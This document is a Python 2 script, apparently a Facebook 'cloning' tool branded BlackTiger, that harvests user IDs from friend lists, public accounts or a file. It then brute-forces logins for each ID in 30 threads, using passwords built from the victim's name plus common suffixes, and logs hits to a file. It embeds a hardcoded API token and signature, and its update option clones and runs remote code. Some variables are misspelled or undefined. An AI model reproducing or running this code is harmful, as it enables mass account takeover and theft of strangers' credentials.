#!/usr/bin/python2
#coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    os.system('python2 bNew.py')

from requests.exceptions import ConnectionError
from mechanize import Browser

#### browser ####
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36')]
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.1; Touch; rv:11.2; WPDesktop; Lumia 730 Dual SIM) like Gecko')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 10.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 7.0.1; SM-J500M Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; RM-1068) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 5.0; Moto G (5) Build/NPPS25.137-33-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;]')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 4.4.4; SM-T116BU Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70')]
br.addheaders = [('User-Agent','Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/98.0.0.48.70;FBBV/62465497;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/VIVO;FBID/phone;FBLC/pt_BR;FBOP/5;FB')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36')]
br.addheaders = [('User-Agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')]

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#### exit ####
def exb():
	print (R + 'Exit')
	os.sys.exit()

#### clear ####
def cb():
    os.system('clear')

#### time sleep ####
def t():
    time.sleep(1)
def t1():
    time.sleep(0.01)

#### print std ####
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		t1()

#### token remove ####
def trb():
    os.system('rm -rf token.txt')

##### LOGO #####
logo='''
\033[1;92m•♚◆━━━◆♤◆━━━◆♚◆━━━◆♤◆━━━◆♤◆━━━◆
\033[1;97m•♚☆ۣۜۜ͜͡BlackTiger-Error404 ♤♚ 
\033[1;92m•♚◆━━━◆♤◆━━━◆♚◆━━━◆♤◆━━━◆♤◆━━━◆
\033[1;93m╭╮╮╱▔▔▔▔╲╭╭╮ \033[1;93m╭╮╮╱▔▔▔▔╲╭╭╮ 
\033[1;97m╰╲╲▏▂╲╱▂▕╱╱╯ \033[1;97m╰╲╲▏▂╲╱▂▕╱╱╯ 
\033[1;91m┈┈╲▏▇▏▕▇▕╱┈┈ \033[1;91m┈┈╲▏▇▏▕▇▕╱┈┈
\033[1;91m┈┈╱╲▔▕▍▔╱╲┈┈ \033[1;91m┈┈╱╲▔▕▍▔╱╲┈┈ 
\033[1;97m╭╱╱▕╋╋╋╋▏╲╲╮ \033[1;97m╭╱╱▕╋╋╋╋▏╲╲╮
\033[1;93m╰╯╯┈╲▂▂╱┈╰╰╯ \033[1;93m╰╯╯┈╲▂▂╱┈╰╰╯
\033[1;92m•♚◆━━━◆♤◆━━━◆♚◆━━━◆♤◆━━━◆♤◆━━━◆
\033[1;97m•♚☆ۣۜۜ͜͡BlackTiger-Error404 ♤♚
\033[1;92m•♚◆━━━◆♤◆━━━◆♚◆━━━◆♤◆━━━◆♤◆━━━◆
\033[1;93m╭┳✪✪╤────────────────────────────✪✪➛➢
\033[1;94m•🎭▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅🎭
\033[1;91m[💈♚♚💈]Name→\033[1;97mBlackTiger-Error404🐅
\033[1;92m[💈♚♚💈]WA☏→\033[1;96m+923037335114👀
\033[1;93m[💈♚♚💈]YT_Channal→\033[1;95m Time4 You⏰
\033[1;91m[💈♚♚💈]Github→\033[1;94mBlackTiger-Error404🀄
\033[1;95m[💈♚♚💈]From→\033[1;92mPakistan🏰         
\033[1;94m•🎭▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅🎭
\033[1;93m╰┻✪✪╧────────────────────────────✪✪➛➢
\033[1;92m•♚◆━━━◆♤◆━━━◆♚◆━━━◆♤◆━━━◆♤◆━━━◆
\033[1;97m•♚☆ۣۜۜ͜͡BlackTiger-Error404 ♤♚
\033[1;92m•♚◆━━━◆♤◆━━━◆♚◆━━━◆♤◆━━━◆♤◆━━━◆
\033[1;93m╭╮╮╱▔▔▔▔╲╭╭╮ \033[1;93m╭╮╮╱▔▔▔▔╲╭╭╮ 
\033[1;97m╰╲╲▏▂╲╱▂▕╱╱╯ \033[1;97m╰╲╲▏▂╲╱▂▕╱╱╯ 
\033[1;91m┈┈╲▏▇▏▕▇▕╱┈┈ \033[1;91m┈┈╲▏▇▏▕▇▕╱┈┈
\033[1;91m┈┈╱╲▔▕▍▔╱╲┈┈ \033[1;91m┈┈╱╲▔▕▍▔╱╲┈┈ 
\033[1;97m╭╱╱▕╋╋╋╋▏╲╲╮ \033[1;97m╭╱╱▕╋╋╋╋▏╲╲╮
\033[1;93m╰╯╯┈╲▂▂╱┈╰╰╯ \033[1;93m╰╯╯┈╲▂▂╱┈╰╰╯
\033[1;92m•♚◆━━━◆♤◆━━━◆♚◆━━━◆♤◆━━━◆♤◆━━━◆
\033[1;97m•♚☆ۣۜۜ͜͡BlackTiger-Error404 ♤♚ 
\033[1;92m•♚◆━━━◆♤◆━━━◆♚◆━━━◆♤◆━━━◆♤◆━━━◆

                                '''
back=0
successfull=[]
checkpoint=[]
oks=[]
cps=[]
id=[]

#### login ####
def login():
	cb()
	try:
		tb=open('token.txt', 'r')
		menu() 
	except (KeyError,IOError):
		cb()
		print (logo)
		print (G + '◈━━━━▷' + Y + ' Login With ✬🄵🄰🄲🄴🄱🄾🄾🄺✬ ' + G + '◁━━━━◈')
		print
		id=raw_input(Y + '[🎯] ' + P + 'Email: ' + G +'')
		pwd=getpass.getpass(Y + '[Hide is ] ' + R + 'Password : ')
		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		z=json.load(data)
		if 'access_token' in z:
		    st = open("token.txt", "w")
		    st.write(z["access_token"])
		    st.close()
		    print (Y + '[🐯]' + G + ' Login successfull BlackTiger ✓')
		    menu()
		else:
		    if "www.facebook.com" in z["error_msg"]:
		        print (R + 'Account checkpoint !')
		        t()
		        login()
		    else:
		        print (R + 'number/user id/ password is wrong !')
		        trb()
		        t()
		        login()
def menu():
	cb()
	try:
		tb=open('token.txt','r').read()
	except IOError:
		print (R + 'Token Invalid !')
		trb()
		t()
		login()
	try:
		otw=requests.get('https://graph.facebook.com/me?access_token='+tb)
		a=json.loads(otw.text)
	except KeyError:
		print (G + 'Account checkpoint !')
		trb()
		t()
		login()
	except requests.exceptions.ConnectionError:
		print (W + 'No internet connection !')
		t()
		exb()
	cb()
	print (logo)
	print
	print  """\033[1;92m⊱✪✪⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯✪✪⊰"""
	print (B + '[☆] ' + P + 'ID Name: ' + Y + a['name'])
	print (B + '[☆] ' + G + 'User ID: ' + S + a['id'])
	print  """\033[1;92m⊱✪✪⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯✪✪⊰"""
	print
	print (S + 50*'-')
	print
	print  """\033[1;92m⊱✪✪⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯✪✪⊰"""
	print (S + '[' + B + '☞1' + S + ']' + R + ' BlackTiger Fast Cloning ')
	print (S + '[' + P + '☞2' + S + ']' + G + ' Update BlackTiger Tool')
	print (S + '[' + R + '☞3' + S + ']' + P + ' Join My WA Group')
	print (S + '[' + Y + '☞4' + S + ']' + Y + ' LogOut')
	print (S + '[' + G + '☞0' + S + ']' + B + ' Exit')
	print  """\033[1;92m⊱✪✪⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯✪✪⊰"""
	print
	print (S + 50*'-')
	print
	mb()


def mb():
	bm=raw_input(W + ' 🐯🄵🄰🄲🄴🄱🄾🄾🄺🐯   ')
	if bm =='':
		print (R + 'Select a valid option !')
		mb()
	elif bm =='1':
		pak()
	elif bm =='2':
	    os.system('rm -rf $HOME/TigerAK47')
	    os.system('cd $HOME && git clone https://github.com/BlackTiger-Error404/bNew/')
	    cb()
	    print (logo)
	    psb('☆▇ ▇ 10%')
	    psb('☆☆▇ ▇ 20%')
	    psb('☆☆☆▇ ▇ 30%')
	    psb('☆☆☆☆▇ ▇ 40%')
	    psb('☆☆☆☆☆▇ ▇ 50%')
	    psb('☆☆☆☆☆☆▇ ▇ 60%')
	    psb('☆☆☆☆☆☆☆▇ ▇ 70%')
	    psb('☆☆☆☆☆☆☆☆▇ ▇ 80%')
	    psb('☆☆☆☆☆☆☆☆☆▇ ▇ 90%')
	    psb('☆☆☆☆☆☆☆☆☆☆▇ ▇ 100%')
	    psb(' login new Fb Account✓')
	    psb('WellCome To BlackTiger Tool')
	    psb('Congratulations BlackTiger Tool Has Been Updated Successfully')
	    psb('🔓User Name☆ bNew✓')
	    psb('🔓Password ☆ Tiger404✓')
	    psb('Subscribe my youtube channal (Time4 You)')
	    psb('Please Login Again')
	    time.sleep(2)
	    os.system('cd $HOME/TigerAK47 && python2 bNew.py')
	elif bm =='3':
	    os.system('xdg-open https://chat.whatsapp.com/DlczgDKHaZJ4qFbpVK49OC')
	    menu()
	elif bm =='4':
		psb('Token Has Been Removed')
		trb()
		t()
		exb()
	elif bm =='0':
	    exb()
	else:
		print (R+'Fill in correctly !')
		mb()


def pak():
	global tb
	try:
		tb=open('token.txt','r').read()
	except IOError:
		print (R + ' Invalid Token !')
		trb()
		t()
		login()
	cb()
	print (logo)
	print  """\033[1;92m⊱✪✪⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯✪✪⊰"""
	print (S + '[' + P + '☞1' + S + ']' + Y + ' Hack login Id Friend List')
	print (S + '[' + Y + '☞2' + S + ']' + Y + ' Hack From Public Account')
	print (S + '[' + B + '☞3' + S + ']' + G + ' Hack Target From Pass list File')
	print (S + '[' + R + '☞4' + S + ']' + G + ' (YouTube Ch Link')
	print (S + '[' + W +'☞5' + S + ']' + P + ' (1Join WA group')
	print (S + '[' + R + '☞0' + S + ']' + R + ' Back')
	print  """\033[1;92m⊱✪✪⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯✪✪⊰"""
	print
	print (S + 50*'-')
	print
	pb()

def pb():
	bp=raw_input(W + ' 🐯🄵🄰🄲🄴🄱🄾🄾🄺🐯   ')
	if bp =='':
		print (R + 'Select a valid option !')
		pb()
	elif bp =='1':
		cb()
		print (logo)
		r=requests.get('https://graph.facebook.com/me/friends?access_token='+tb)
		z=json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif bp=='2':
		cb()
		print (logo)
		idt=raw_input(S + '[🌀] ' + G + 'Put Public User ID/User Name: ' + W + '')
		cb()
		print (logo)
		try:
			jok=requests.get('https://graph.facebook.com/'+idt+'?access_token='+tb)
			op=json.loads(jok.text)
			psb(S + '[🌀]' + G + ' Account  Name: ' + W + op['name'])
		except KeyError:
			print (R + ' ID not found !')
			raw_input(R + ' Back')
			pak()
		r=requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+tb)
		z=json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif bp =='3':
		cb()
		print (logo)
		try:
			idlist=raw_input(S + '[🎫] ' + R + 'Enter File Path: ' + G + '')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print (R + ' File Not Found !')
			raw_input(R + ' Back')
			pak()
	elif bp =='4':
		os.system('xdg-open https://www.youtube.com/channel/UCqAyAEOedaDlFVsZFravPpw')
		menu()
	elif bp =='5':
		os.system('xdg-open https://chat.whatsapp.com/DlczgDKHaZJ4qFbpVK49OC')
		menu()
		
	elif bp =='0':
		menu()
	else:
		print (R + ' Select a valid option !')
		pb()
	print (S + '[🎭]' + P + ' Total Friends: ' + W + str(len(id)))
	psb(S + '[🎭]' + Y + ' To stop process  click on CTRL ~ Z')
	print
	print (S + 50*'-')
	print
	def main(arg):
		global cps, oks
		user=arg
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass1 + ' 👽 ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass1 + ' 👽 ' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass2 + ' 👽 ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass2 + ' 👽 ' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass3 + ' 👽 ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass3 + ' 👽 ' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass4 + ' 👽 ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass4 + ' 👽 ' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = '786786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass5 + ' 👽 ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass5 + ' 👽 ' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass6 + ' 👽 ' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass6 + ' 👽 ' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Pakistan'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass7 + ' 👽 ' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass7 + ' 👽 ' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
		except:
			pass
	p=ThreadPool(30)
	p.map(main, id)
	print
	print(S+50*'-')
	print
	print  """\033[1;92m⊱✪✪⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯✪✪⊰"""
	print(S+'Process has been completed CP ID Open After 7 Days ')
	print(Y+'Total '+G+'OK'+S+'/'+W+'CP'+S+' = '+G+str(len(oks))+S+'/'+W+str(len(cps)))
	print(S+'BlackTiger(Whatsapp +923037335114')     
	print  """\033[1;92m⊱✪✪⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯✪✪⊰"""
	print
	raw_input(R + 'Back')
	os.system('python2 bNew.py')
if __name__=='__main__':
    login()

